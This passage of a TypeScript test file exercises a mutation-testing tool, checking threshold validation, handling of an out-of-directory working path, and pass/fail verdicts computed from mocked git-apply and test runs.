				initGitRepo(tempDir);
				fsSync.writeFileSync(
					path.join(tempDir, 'src.ts'),
					'export function fn() { return 1; }\n',
					'utf-8',
				);

				const result = await executeMutationTest(
					{
						patches: [
							{
								id: '1',
								filePath: 'src.ts',
								functionName: 'fn',
								mutationType: 't',
								patch: `diff --git a/src.ts b/src.ts\nindex 1234567..abcdefg 100644\n--- a/src.ts\n+++ b/src.ts\n@@ -1 +1 @@\n export function fn() { return 1; }\n`,
							},
						],
						files: ['test.test.ts'],
						test_command: ['echo', 'test'],
						pass_threshold: 0.3,
						warn_threshold: 0.7,
					},
					tempDir,
				);
				const parsed = JSON.parse(result);
				expect(parsed.success).toBe(false);
				expect(parsed.error).toContain('passThreshold');
			},
		);

		test(
			'working_directory pointing outside temp dir — returns error or valid result',
			{ timeout: 15000 },
			async () => {
				const result = await executeMutationTest(
					{
						patches: [
							{
								id: '1',
								filePath: 'f.ts',
								functionName: 'fn',
								mutationType: 't',
								patch: 'diff',
							},
						],
						files: ['test.test.ts'],
						test_command: ['echo', 'test'],
						working_directory: '../../../tmp/non-existent-path',
					},
					tempDir,
				);
				const parsed = JSON.parse(result);
				// Either success:false (file not readable) or a valid result from the engine
				expect(parsed).toBeDefined();
				// Should not crash — returns either an error or a real verdict
				if (parsed.success === false) {
					expect(parsed.error).toBeDefined();
				}
			},
		);
	});

	// -------------------------------------------------------------------------
	// Category 10: end-to-end verdict with real executeMutationSuite + evaluateMutationGate
	// -------------------------------------------------------------------------

	describe('10. End-to-end mutation_test.execute — real suite + gate verdicts', () => {
		let executeMutationTest: (
			args: unknown,
			directory: string,
		) => Promise<string>;

		beforeEach(async () => {
			const mod = await import('../mutation-test.js');
			executeMutationTest = mod.mutation_test.execute as unknown as (
				args: unknown,
				directory: string,
			) => Promise<string>;
		});

		test(
			'0% kill rate → fail verdict (all mutants survive)',
			{ timeout: 15000 },
			async () => {
				initGitRepo(tempDir);
				fsSync.writeFileSync(
					path.join(tempDir, 'src.ts'),
					'export function fn() { return 1; }\n',
					'utf-8',
				);

				// git apply succeeds, test always passes (survived)
				mockSpawnSync.mockImplementation(
					(cmd: string, args: string[], opts: Record<string, unknown>) => {
						if (cmd === 'git' && args[0] === 'apply') {
							return {
								pid: 1,
								output: Buffer.alloc(0),
								stdout: Buffer.alloc(0),
								stderr: Buffer.alloc(0),
								status: 0,
								signal: null,
								error: undefined,
							};
						}
						// Test passes → mutant survives
						return {
							pid: 2,
							output: Buffer.alloc(0),
							stdout: Buffer.from('ok'),
							stderr: Buffer.alloc(0),
							status: 0,
							signal: null,
							error: undefined,
						};
					},
				);

				const patch = `diff --git a/src.ts b/src.ts\nindex 1234567..abcdefg 100644\n--- a/src.ts\n+++ b/src.ts\n@@ -1 +1 @@\n export function fn() { return 1; }\n`;

				const result = await executeMutationTest(
					{
						patches: [
							{
								id: '1',
								filePath: 'src.ts',
								functionName: 'fn',
								mutationType: 'type',
								patch,
							},
						],
						files: ['test.test.ts'],
						test_command: ['echo', 'test'],
						pass_threshold: 0.8,
						warn_threshold: 0.6,
					},
					tempDir,
				);

				const parsed = JSON.parse(result);
				expect(parsed.verdict).toBe('fail');
				expect(parsed.adjustedKillRate).toBe(0);
			},
		);

		test(
			'100% kill rate → pass verdict (all mutants killed)',
			{ timeout: 15000 },
			async () => {
				initGitRepo(tempDir);
				fsSync.writeFileSync(
					path.join(tempDir, 'src.ts'),
					'export function fn() { return 1; }\n',
					'utf-8',
				);

				// git apply succeeds, test always fails (killed)
				mockSpawnSync.mockImplementation(
					(cmd: string, args: string[], opts: Record<string, unknown>) => {
						if (cmd === 'git' && args[0] === 'apply') {
							return {
								pid: 1,
								output: Buffer.alloc(0),
								stdout: Buffer.alloc(0),
								stderr: Buffer.alloc(0),
								status: 0,
								signal: null,
								error: undefined,
							};
						}
						return {
							pid: 2,
							output: Buffer.alloc(0),
							stdout: Buffer.from('FAIL'),
							stderr: Buffer.alloc(0),
							status: 1,
							signal: null,
							error: undefined,
						};
					},
				);

				const patch = `diff --git a/src.ts b/src.ts\nindex 1234567..abcdefg 100644\n--- a/src.ts\n+++ b/src.ts\n@@ -1 +1 @@\n export function fn() { return 1; }\n`;

				const result = await executeMutationTest(
					{
						patches: [
							{
								id: '1',
								filePath: 'src.ts',
								functionName: 'fn',
								mutationType: 'type',
								patch,
							},
						],
						files: ['test.test.ts'],
						test_command: ['echo', 'test'],
						pass_threshold: 0.8,
						warn_threshold: 0.6,
					},
					tempDir,
				);

				const parsed = JSON.parse(result);
				expect(parsed.verdict).toBe('pass');
				expect(parsed.adjustedKillRate).toBe(1);
			},
		);

		test(
			'50% kill rate → fail verdict (below warn threshold of 0.6)',
			{ timeout: 20000 },
			async () => {
				initGitRepo(tempDir);
				fsSync.writeFileSync(
					path.join(tempDir, 'src.ts'),
					'export function fn() { return 1; }\n',
					'utf-8',
				);

				let callCount = 0;
				mockSpawnSync.mockImplementation(
					(cmd: string, args: string[], opts: Record<string, unknown>) => {
						if (cmd === 'git' && args[0] === 'apply') {
							return {
								pid: 1,
								output: Buffer.alloc(0),
								stdout: Buffer.alloc(0),
								stderr: Buffer.alloc(0),
								status: 0,
								signal: null,
								error: undefined,
							};
						}
						callCount++;
						// Alternating: killed (odd), survived (even)
						return {
							pid: 2,
							output: Buffer.alloc(0),
							stdout: Buffer.from('ok'),
							stderr: Buffer.alloc(0),
							status: callCount % 2 === 1 ? 1 : 0,
							signal: null,
							error: undefined,
						};
					},
				);

				const patch = `diff --git a/src.ts b/src.ts\nindex 1234567..abcdefg 100644\n--- a/src.ts\n+++ b/src.ts\n@@ -1 +1 @@\n export function fn() { return 1; }\n`;

				const result = await executeMutationTest(
					{
						patches: [
							{
								id: '1',
								filePath: 'src.ts',
								functionName: 'fn1',
								mutationType: 'type',
								patch,
							},
							{
								id: '2',
								filePath: 'src.ts',
								functionName: 'fn2',
								mutationType: 'type',
								patch,
							},
						],
						files: ['test.test.ts'],
						test_command: ['echo', 'test'],
						pass_threshold: 0.8,
						warn_threshold: 0.6,
					},
					tempDir,
				);

				const parsed = JSON.parse(result);
				// 1 killed / 2 total = 0.5 kill rate, below 0.6 warn → fail
				expect(parsed.verdict).toBe('fail');
				expect(parsed.adjustedKillRate).toBe(0.5);
			},
		);
	});
});
